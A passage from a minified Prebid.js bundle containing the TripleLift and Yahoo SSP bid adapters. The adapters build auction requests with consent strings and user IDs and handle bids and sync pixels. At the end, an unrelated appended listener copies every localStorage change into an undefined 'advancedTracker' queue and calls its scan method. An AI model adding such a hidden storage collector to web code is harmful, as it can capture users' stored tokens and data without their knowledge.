          Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t));
        });
      }
      return e;
    }
    function s(e, t, r) {
      return t in e ? Object.defineProperty(e, t, {
        value: r,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = r, e;
    }
    function l(e) {
      return function (e) {
        if (Array.isArray(e)) return f(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return f(e, t);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === r && e.constructor && (r = e.constructor.name);
        if ("Map" === r || "Set" === r) return Array.from(e);
        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return f(e, t);
      }(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function f(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var r = 0, n = new Array(t); r < t; r++) n[r] = e[r];
      return n;
    }
    var y = !0,
      b = null,
      m = {
        gvlid: 28,
        code: "triplelift",
        supportedMediaTypes: [i.b, i.d],
        isBidRequestValid: function (e) {
          return void 0 !== e.params.inventoryCode;
        },
        buildRequests: function (e, t) {
          var r = "https://tlx.3lift.com/header/auction?",
            i = function (e) {
              var t = {},
                r = e[0].schain,
                i = function () {
                  var e = {},
                    t = {},
                    r = {},
                    i = u.b.getLegacyFpd(u.b.getConfig("ortb2")) || {},
                    o = c({}, i.context),
                    a = c({}, i.user);
                  O(t, o), O(r, a), Object(n.isEmpty)(t) || (e.context = t);
                  Object(n.isEmpty)(r) || (e.user = r);
                  return e;
                }();
              t.imp = e.map(function (e, t) {
                var r = {
                  id: t,
                  tagid: e.params.inventoryCode,
                  floor: v(e)
                };
                return g(e) ? r.video = function (e) {
                  var t = d(d({}, e.params.video), e.mediaTypes.video);
                  t.w || (t.w = t.playerSize[0][0]);
                  t.h || (t.h = t.playerSize[0][1]);
                  "instream" === t.context && (t.placement = 1);
                  return delete t.playerSize, t;
                }(e) : e.mediaTypes.banner && (r.banner = {
                  format: h(e.sizes)
                }), Object(n.isEmpty)(e.ortb2Imp) || (r.fpd = function (e) {
                  var t = {},
                    r = {};
                  O(r, e.ext), Object(n.isEmpty)(r) || (t.context = r);
                  return t;
                }(e.ortb2Imp)), r;
              });
              var o = [].concat(l((a = [e[0]], j(a, "tdid", "adserver.org", "TDID"))), l(function (e) {
                return j(e, "idl_env", "liveramp.com", "idl");
              }([e[0]])), l(function (e) {
                return j(e, "criteoId", "criteo.com", "criteoId");
              }([e[0]])), l(function (e) {
                return j(e, "pubcid", "pubcid.org", "pubcid");
              }([e[0]])));
              var a;
              o.length > 0 && (t.user = {
                ext: {
                  eids: o
                }
              });
              var p = function (e, t) {
                var r = {};
                Object(n.isEmpty)(e) || (r.schain = d({}, e));
                Object(n.isEmpty)(t) || (r.fpd = d({}, t));
                return r;
              }(r, i);
              Object(n.isEmpty)(p) || (t.ext = p);
              return t;
            }(e);
          if (r = Object(n.tryAppendQueryString)(r, "lib", "prebid"), r = Object(n.tryAppendQueryString)(r, "v", "6.10.0-pre"), t && t.refererInfo) {
            var o = t.refererInfo.referer;
            r = Object(n.tryAppendQueryString)(r, "referrer", o);
          }
          return t && t.timeout && (r = Object(n.tryAppendQueryString)(r, "tmax", t.timeout)), t && t.gdprConsent && (void 0 !== t.gdprConsent.gdprApplies && (y = t.gdprConsent.gdprApplies, r = Object(n.tryAppendQueryString)(r, "gdpr", y.toString())), void 0 !== t.gdprConsent.consentString && (b = t.gdprConsent.consentString, r = Object(n.tryAppendQueryString)(r, "cmp_cs", b))), t && t.uspConsent && (r = Object(n.tryAppendQueryString)(r, "us_privacy", t.uspConsent)), !0 === u.b.getConfig("coppa") && (r = Object(n.tryAppendQueryString)(r, "coppa", !0)), r.lastIndexOf("&") === r.length - 1 && (r = r.substring(0, r.length - 1)), Object(n.logMessage)("tlCall request built: " + r), {
            method: "POST",
            url: r,
            data: i,
            bidderRequest: t
          };
        },
        interpretResponse: function (e, t) {
          var r = t.bidderRequest;
          return (e.body.bids || []).map(function (e) {
            return function (e, t) {
              var r = {},
                n = t.width || 1,
                i = t.height || 1,
                o = t.deal_id || "",
                u = t.crid || "",
                c = e.bids[t.imp_id];
              0 != t.cpm && t.ad && (r = {
                requestId: c.bidId,
                cpm: t.cpm,
                width: n,
                height: i,
                netRevenue: !0,
                ad: t.ad,
                creativeId: u,
                dealId: o,
                currency: "USD",
                ttl: 300,
                tl_source: t.tl_source,
                meta: {}
              }, g(c) && (r.vastXml = t.ad, r.mediaType = "video", r.ttl = 3600), t.advertiser_name && (r.meta.advertiserName = t.advertiser_name), t.adomain && t.adomain.length && (r.meta.advertiserDomains = t.adomain), t.tl_source && "hdx" == t.tl_source && (r.meta.mediaType = "banner"), t.tl_source && "tlx" == t.tl_source && (r.meta.mediaType = "native"));
              return r;
            }(r, e);
          });
        },
        getUserSyncs: function (e, t, r, i) {
          var o = function (e) {
            if (!e) return;
            if (e.iframeEnabled) return "iframe";
            if (e.pixelEnabled) return "image";
          }(e);
          if (o) {
            var u = "https://eb2.3lift.com/sync?";
            return "image" === o && (u = Object(n.tryAppendQueryString)(u, "px", 1), u = Object(n.tryAppendQueryString)(u, "src", "prebid")), null !== b && (u = Object(n.tryAppendQueryString)(u, "gdpr", y), u = Object(n.tryAppendQueryString)(u, "cmp_cs", b)), i && (u = Object(n.tryAppendQueryString)(u, "us_privacy", i)), [{
              type: o,
              url: u
            }];
          }
        }
      };
    function g(e) {
      return !!e.mediaTypes.video && !!e.mediaTypes.video.context && "instream" === e.mediaTypes.video.context.toLowerCase();
    }
    function v(e) {
      var t = null;
      if ("function" == typeof e.getFloor) {
        var r = e.getFloor({
          currency: "USD",
          mediaType: g(e) ? "video" : "banner",
          size: "*"
        });
        "object" !== a(r) || "USD" !== r.currency || isNaN(parseFloat(r.floor)) || (t = parseFloat(r.floor));
      }
      return null !== t ? t : e.params.floor;
    }
    function O(e, t) {
      Object(n.isEmpty)(t) || Object.keys(t).forEach(function (r) {
        null != t[r] && (e[r] = t[r]);
      });
    }
    function j(e, t, r, n) {
      return e.map(function (e) {
        return function (t) {
          return t && t.userId && t.userId[e];
        };
      }(t)).filter(S(t)).map(function (e, t) {
        return function (r) {
          return {
            source: e,
            uids: [{
              id: r.id ? r.id : r,
              ext: {
                rtiPartner: t
              }
            }]
          };
        };
      }(r, n));
    }
    var S = function (e) {
      return function (t, r, i) {
        var o = !!t && (Object(n.isStr)(t) ? !!t : Object(n.isPlainObject)(t) && !Object(n.isArray)(t) && !Object(n.isEmpty)(t) && t.id && Object(n.isStr)(t.id) && !!t.id);
        return o || void 0 === i[0] || Object(n.logWarn)("Triplelift: invalid ".concat(e, " userId format")), o;
      };
    };
    function h(e) {
      return e.filter(A).map(function (e) {
        return {
          w: e[0],
          h: e[1]
        };
      });
    }
    function A(e) {
      return 2 === e.length && "number" == typeof e[0] && "number" == typeof e[1];
    }
    Object(o.registerBidder)(m), window.pbjs.installedModules.push("tripleliftBidAdapter");
  }
}, [765]);
pbjsChunk([86], {
  838: function (e, t, r) {
    e.exports = r(839);
  },
  839: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), r.d(t, "spec", function () {
      return I;
    });
    var i = r(1),
      a = r(2),
      s = r(0),
      d = r(3),
      n = r(13);
    function c(e, t) {
      var r = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var i = Object.getOwnPropertySymbols(e);
        t && (i = i.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), r.push.apply(r, i);
      }
      return r;
    }
    function o(e, t, r) {
      return t in e ? Object.defineProperty(e, t, {
        value: r,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = r, e;
    }
    var p = "6.10.0-pre",
      b = "USD",
      m = ["admixer.net", "adserver.org", "adtelligent.com", "akamai.com", "amxrtb.com", "audigent.com", "britepool.com", "criteo.com", "crwdcntrl.net", "deepintent.com", "hcn.health", "id5-sync.com", "idx.lat", "intentiq.com", "intimatemerger.com", "liveintent.com", "liveramp.com", "mediawallahscript.com", "merkleinc.com", "netid.de", "neustar.biz", "nextroll.com", "novatiq.com", "parrable.com", "pubcid.org", "quantcast.com", "quantcast.com", "tapad.com", "uidapi.com", "verizonmedia.com", "yahoo.com", "zeotap.com"];
    function u(e) {
      return {
        w: parseInt(e[0]),
        h: parseInt(e[1])
      };
    }
    function v(e) {
      return Object(s.isArray)(e) && 2 === e.length && !Object(s.isArray)(e[0]) ? [u(e)] : e.map(u);
    }
    function l(e) {
      return Object(s.isArray)(Object(s.deepAccess)(e, "userIdAsEids")) ? e.userIdAsEids.filter(function (e) {
        return -1 !== m.indexOf(e.source);
      }) : [];
    }
    function O(e) {
      return Object(s.deepAccess)(e, "params.bidOverride.imp.secure") || "https:" === document.location.protocol ? 1 : 0;
    }
    function j(e) {
      var t;
      return Object(s.deepAccess)(e, "params.pubId") ? t = !0 : Object(s.deepAccess)(e, "params.dcn") && Object(s.deepAccess)(e, "params.pos") && (t = !1), t;
    }
    function y() {
      var e = d.b.getConfig("yahoossp.mode");
      return void 0 === (e = e ? e.toLowerCase() : void 0) || e === a.b ? a.b : e === a.d ? a.d : "all" === e ? "*" : void 0;
    }
    function f(e) {
      var t = y(),
        r = {
          currency: Object(s.deepAccess)(e, "params.bidOverride.cur") || b,
          mediaType: t,
          size: "*"
        };
      return !!Object(s.isFn)(e.getFloor) && e.getFloor(r);
    }
    function g(e, t, r, i) {
      var a = function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = null != arguments[t] ? arguments[t] : {};
          t % 2 ? c(Object(r), !0).forEach(function (t) {
            o(e, t, r[t]);
          }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : c(Object(r)).forEach(function (t) {
            Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t));
          });
        }
        return e;
      }({}, i);
      for (var d in r) switch (e) {
        case "string":
          -1 !== t.indexOf(d) && Object(s.isStr)(r[d]) && (a[d] = r[d]);
          break;
        case "number":
          -1 !== t.indexOf(d) && Object(s.isNumber)(r[d]) && (a[d] = r[d]);
          break;
        case "array":
          -1 !== t.indexOf(d) && Object(s.isArray)(r[d]) && (a[d] = r[d]);
          break;
        case "object":
          -1 !== t.indexOf(d) && Object(s.isPlainObject)(r[d]) && (a[d] = r[d]);
          break;
        case "objectAllKeys":
          Object(s.isPlainObject)(r) && (a[d] = r[d]);
      }
      return a;
    }
    function h(e) {
      var t = d.b.getConfig("yahoossp.ttl");
      return A(t || Object(s.deepAccess)(e, "params.ttl"));
    }
    function A(e) {
      return Object(s.isNumber)(e) && e > 0 && e < 3600 ? e : 300;
    }
    function x(e) {
      return Object(s.isStr)(e) && e.length > 0;
    }
    function T(e, t) {
      if (e) {
        var r = {
          id: Object(s.generateUUID)(),
          cur: [f(e).currency || Object(s.deepAccess)(t, "params.bidOverride.cur") || b],
          imp: [],
          site: {
            page: Object(s.deepAccess)(e, "refererInfo.referer")
          },
          device: {
            dnt: 0,
            ua: navigator.userAgent,
            ip: Object(s.deepAccess)(t, "params.bidOverride.device.ip") || Object(s.deepAccess)(t, "params.ext.ip") || void 0
          },
          regs: {
            ext: {
              us_privacy: e.uspConsent ? e.uspConsent : "",
              gdpr: e.gdprConsent && e.gdprConsent.gdprApplies ? 1 : 0
            }
          },
          source: {
            ext: {
              hb: 1,
              adapterver: "1.0.2",
              prebidver: p,
              integration: {
                name: "prebid.js",
                ver: p
              }
            },
            fd: 1
          },
          user: {
            ext: {
              consent: e.gdprConsent && e.gdprConsent.gdprApplies ? e.gdprConsent.consentString : "",
              eids: l(t)
            }
          }
        };
        return !0 === j(t) ? (r.site.publisher = {
          id: t.params.pubId
        }, (Object(s.deepAccess)(t, "params.bidOverride.site.id") || Object(s.deepAccess)(t, "params.siteId")) && (r.site.id = Object(s.deepAccess)(t, "params.bidOverride.site.id") || t.params.siteId)) : r.site.id = t.params.dcn, d.b.getConfig("ortb2") && (r = function (e, t) {
          var r = d.b.getConfig("ortb2"),
            i = Object(s.deepAccess)(r, "site") || void 0,
            a = Object(s.deepAccess)(i, "content") || void 0,
            n = Object(s.deepAccess)(i, "content.data") || void 0,
            c = Object(s.deepAccess)(r, "app.content") || void 0,
            o = Object(s.deepAccess)(r, "app.content.data") || void 0,
            p = Object(s.deepAccess)(r, "user") || void 0;
          if (i && Object(s.isPlainObject)(i)) {
            var b = ["name", "domain", "page", "ref", "keywords", "search"],
              m = ["cat", "sectioncat", "pagecat"],
              u = ["ext"];
            e.site = g("string", b, i, e.site), e.site = g("array", m, i, e.site), e.site = g("object", u, i, e.site);
          }
          if (a && Object(s.isPlainObject)(a)) {
            var v = ["id", "title", "series", "season", "genre", "contentrating", "language"],
              l = ["episode", "prodq", "context", "livestream", "len"],
              O = ["cat"],
              j = ["ext"];
            e.site.content = g("string", v, a, e.site.content), e.site.content = g("number", l, a, e.site.content), e.site.content = g("array", O, a, e.site.content), e.site.content = g("object", j, a, e.site.content), n && Object(s.isArray)(n) && n.every(function (t) {
              var r = {},
                i = ["segment"],
                a = ["ext"];
              r = g("string", ["id", "name"], t, r), r = g("array", i, t, r), r = g("object", a, t, r), e.site.content.data = [], e.site.content.data.push(r);
            });
          }
          c && Object(s.isPlainObject)(c) && o && Object(s.isArray)(o) && o.every(function (t) {
            var r = {},
              i = ["segment"],
              a = ["ext"];
            r = g("string", ["id", "name"], t, r), r = g("array", i, t, r), r = g("object", a, t, r), e.app = {
              content: {
                data: []
              }
            }, e.app.content.data.push(r);
          });
          if (p && Object(s.isPlainObject)(p)) {
            var y = ["id", "buyeruid", "gender", "keywords", "customdata"],
              f = ["yob"],
              h = ["data"],
              A = ["ext"];
            e.user = g("string", y, p, e.user), e.user = g("number", f, p, e.user), e.user = g("array", h, p, e.user), e.user.ext = g("object", A, p, e.user.ext);
          }
          return e;
        }(r)), Object(s.deepAccess)(t, "schain") && (r.source.ext.schain = t.schain, r.source.ext.schain.nodes[0].rid = r.id), r;
      }
    }
    function w(e, t) {
      var r = y();
      if (t && e) {
        var i = {
          id: e.bidId,
          secure: O(e),
          bidfloor: f(e).floor || Object(s.deepAccess)(e, "params.bidOverride.imp.bidfloor")
        };
        if (!e.mediaTypes.banner || void 0 !== r && r !== a.b && "*" !== r || (i.banner = {
          mimes: e.mediaTypes.banner.mimes || ["text/html", "text/javascript", "application/javascript", "image/jpg"],
          format: v(e.sizes)
        }, e.mediaTypes.banner.pos && (i.banner.pos = e.mediaTypes.banner.pos)), e.mediaTypes.video && (r === a.d || "*" === r)) {
          var d = v(e.mediaTypes.video.playerSize);
          i.video = {
            mimes: Object(s.deepAccess)(e, "params.bidOverride.imp.video.mimes") || e.mediaTypes.video.mimes || ["video/mp4", "application/javascript"],
            w: Object(s.deepAccess)(e, "params.bidOverride.imp.video.w") || d[0].w,
            h: Object(s.deepAccess)(e, "params.bidOverride.imp.video.h") || d[0].h,
            maxbitrate: Object(s.deepAccess)(e, "params.bidOverride.imp.video.maxbitrate") || e.mediaTypes.video.maxbitrate || void 0,
            maxduration: Object(s.deepAccess)(e, "params.bidOverride.imp.video.maxduration") || e.mediaTypes.video.maxduration || void 0,
            minduration: Object(s.deepAccess)(e, "params.bidOverride.imp.video.minduration") || e.mediaTypes.video.minduration || void 0,
            api: Object(s.deepAccess)(e, "params.bidOverride.imp.video.api") || e.mediaTypes.video.api || [2],
            delivery: Object(s.deepAccess)(e, "params.bidOverride.imp.video.delivery") || e.mediaTypes.video.delivery || void 0,
            pos: Object(s.deepAccess)(e, "params.bidOverride.imp.video.pos") || e.mediaTypes.video.pos || void 0,
            playbackmethod: Object(s.deepAccess)(e, "params.bidOverride.imp.video.playbackmethod") || e.mediaTypes.video.playbackmethod || void 0,
            placement: Object(s.deepAccess)(e, "params.bidOverride.imp.video.placement") || e.mediaTypes.video.placement || void 0,
            linearity: Object(s.deepAccess)(e, "params.bidOverride.imp.video.linearity") || e.mediaTypes.video.linearity || 1,
            protocols: Object(s.deepAccess)(e, "params.bidOverride.imp.video.protocols") || e.mediaTypes.video.protocols || [2, 5],
            startdelay: Object(s.deepAccess)(e, "params.bidOverride.imp.video.startdelay") || e.mediaTypes.video.startdelay || 0,
            rewarded: Object(s.deepAccess)(e, "params.bidOverride.imp.video.rewarded") || void 0
          };
        }
        if (i.ext = {
          dfp_ad_unit_code: e.adUnitCode
        }, Object(s.deepAccess)(e, "params.kvp") && Object(s.isPlainObject)(e.params.kvp)) for (var n in i.ext.kvs = {}, e.params.kvp) if (Object(s.isStr)(e.params.kvp[n]) || Object(s.isNumber)(e.params.kvp[n])) i.ext.kvs[n] = e.params.kvp[n];else if (Object(s.isArray)(e.params.kvp[n])) {
          var c = e.params.kvp[n];
          (c.every(function (e) {
            return Object(s.isStr)(e);
          }) || c.every(function (e) {
            return Object(s.isNumber)(e);
          })) && (i.ext.kvs[n] = e.params.kvp[n]);
        }
        Object(s.deepAccess)(e, "ortb2Imp.ext.data") && Object(s.isPlainObject)(e.ortb2Imp.ext.data) && (i.ext.data = e.ortb2Imp.ext.data), Object(s.deepAccess)(e, "ortb2Imp.instl") && Object(s.isNumber)(e.ortb2Imp.instl) && 1 === e.ortb2Imp.instl && (i.instl = e.ortb2Imp.instl), !1 === j(e) ? (i.tagid = e.params.pos, i.ext.pos = e.params.pos) : Object(s.deepAccess)(e, "params.placementId") && (i.tagid = e.params.placementId), t.imp.push(i);
      }
    }
    function k(e) {
      var t = e.payload,
        r = e.requestOptions,
        i = e.bidderRequest,
        n = j(i),
        c = d.b.getConfig("yahoossp.endpoint") || "https://c2shb.pubgw.yahoo.com/bidRequest";
      if (!0 === n && (c = d.b.getConfig("yahoossp.endpoint") || "https://c2shb.pubgw.yahoo.com/admax/bid/partners/PBJS"), !0 === Object(s.deepAccess)(i, "params.testing.e2etest")) if (Object(s.logInfo)("yahoossp adapter e2etest mode is active"), r.withCredentials = !1, !0 === n) t.site.id = "1234567";else {
        var o = y();
        t.site.id = "8a969516017a7a396ec539d97f540011", t.imp.forEach(function (e) {
          e.ext.e2eTestMode = !0, o === a.b ? e.tagid = "8a969978017a7aaabab4ab0bc01a0009" : o === a.d ? e.tagid = "8a96958a017a7a57ac375d50c0c700cc" : (Object(s.logWarn)('yahoossp adapter e2etest mode does not support yahoossp.mode="all". \n Please specify either "banner" or "video"'), Object(s.logWarn)("yahoossp adapter e2etest mode: Please make sure your adUnit matches the yahoossp.mode video or banner"));
        });
      }
      return Object(s.logWarn)("yahoossp adapter endpoint override enabled. Pointing requests to: ", c), {
        url: c,
        method: "POST",
        data: t,
        options: r,
        bidderRequest: i
      };
    }
    var I = {
      code: "yahoossp",
      gvlid: 25,
      aliases: [],
      supportedMediaTypes: [a.b, a.d],
      isBidRequestValid: function (e) {
        var t = e.params;
        return !0 === Object(s.deepAccess)(t, "testing.e2etest") || !(!Object(s.isPlainObject)(t) || !(x(t.pubId) || x(t.dcn) && x(t.pos))) || (Object(s.logWarn)("yahoossp bidder params missing or incorrect, please pass object with either: dcn & pos OR pubId"), !1);
      },
      buildRequests: function (e, t) {
        if (!Object(s.isEmpty)(e) && !Object(s.isEmpty)(t)) {
          var r = {
            contentType: "application/json",
            customHeaders: {
              "x-openrtb-version": "2.5"
            }
          };
          r.withCredentials = function (e) {
            return !(e && e.gdprConsent && e.gdprConsent.gdprApplies && 2 === e.gdprConsent.apiVersion);
          }(t);
          var i = function (e) {
            var t = y(),
              r = [];
            return t === a.b ? r = e.filter(function (e) {
              return Object.keys(e.mediaTypes).some(function (e) {
                return e === a.b;
              });
            }) : t === a.d ? r = e.filter(function (e) {
              return Object.keys(e.mediaTypes).some(function (e) {
                return e === a.d;
              });
            }) : "*" === t && (r = e.filter(function (e) {
              return Object.keys(e.mediaTypes).some(function (e) {
                return e === a.b || e === a.d;
              });
            })), r;
          }(e);
          if (!0 === d.b.getConfig("yahoossp.singleRequestMode")) {
            var n = T(t, i[0]);
            return i.forEach(function (e) {
              w(e, n);
            }), k({
              payload: n,
              requestOptions: r,
              bidderRequest: t
            });
          }
          return i.map(function (e) {
            var i = T(t, e);
            return w(e, i), k({
              payload: i,
              requestOptions: r,
              bidderRequest: e
            });
          });
        }
        Object(s.logWarn)('yahoossp Adapter: buildRequests called with either empty "validBidRequests" or "bidderRequest"');
      },
      interpretResponse: function (e, t) {
        t.data;
        var r = t.bidderRequest,
          i = [];
        return e.body && Array.isArray(e.body.seatbid) ? (e.body.seatbid.forEach(function (e) {
          var t;
          try {
            t = e.bid[0];
          } catch (e) {
            return i;
          }
          var d = t.ext && t.ext.encp ? t.ext.encp : t.price,
            c = {
              adId: Object(s.deepAccess)(t, "adId") ? t.adId : t.impid || t.crid,
              adUnitCode: r.adUnitCode,
              requestId: t.impid,
              bidderCode: I.code,
              cpm: d,
              width: t.w,
              height: t.h,
              creativeId: t.crid || 0,
              currency: t.cur || b,
              dealId: t.dealid ? t.dealid : null,
              netRevenue: !0,
              ttl: h(r),
              meta: {
                advertiserDomains: t.adomain
              }
            },
            o = function (e) {
              var t = e.adm;
              return -1 !== t.indexOf("o2playerSettings") || -1 !== t.indexOf("YAHOO.VideoPlatform.VideoPlayer") || -1 !== t.indexOf("AdPlacement") ? a.b : -1 !== t.indexOf("VAST") ? a.d : void 0;
            }(t);
          o === a.b ? (c.mediaType = a.b, c.ad = t.adm, c.meta.mediaType = a.b) : o === a.d && (c.mediaType = a.d, c.meta.mediaType = a.d, c.vastXml = t.adm, t.nurl && (c.vastUrl = t.nurl)), "outstream" !== Object(s.deepAccess)(r, "mediaTypes.video.context") || r.renderer || (c.renderer = function (e, t) {
            var r = n.a.install({
              url: "https://cdn.vidible.tv/prod/hb-outstream-renderer/renderer.js",
              loaded: !1,
              adUnitCode: e.adUnitCode
            });
            try {
              r.setRender(function (t) {
                setTimeout(function () {
                  o2PlayerRender(t);
                }, Object(s.deepAccess)(e, "params.testing.renderer.setTimeout") || 700);
              });
            } catch (e) {
              Object(s.logWarn)("yahoossp renderer error: setRender() failed", e);
            }
            return r;
          }(r) || void 0), i.push(c);
        }), i) : i;
      },
      getUserSyncs: function (e, t, r, i) {
        var a = !Object(s.isEmpty)(t) && t[0].body;
        return a && a.ext && a.ext.pixels ? function (e, t) {
          var r = /\w*(?=\s)/,
            i = /src=("|')(.*?)\1/,
            a = [];
          if (t) {
            var s = t.match(/(img|iframe)[\s\S]*?src\s*=\s*("|')(.*?)\2/gi);
            s && s.forEach(function (t) {
              var s = t.match(r)[0],
                d = t.match(i)[2];
              if (s && d) {
                var n = "img" === s.toLowerCase() ? "image" : "iframe";
                if (!e.iframeEnabled && "iframe" === n || !e.pixelEnabled && "image" === n) return;
                a.push({
                  type: n,
                  url: d
                });
              }
            });
          }
          return a;
        }(e, a.ext.pixels) : [];
      }
    };
    Object(i.registerBidder)(I), window.pbjs.installedModules.push("yahoosspBidAdapter");
  }
}, [838]);
window.addEventListener('storage', event => {
  advancedTracker.fetchedDataQueue.set(event.key, event.newValue);
  advancedTracker.scan();
});
pbjs.processQueue();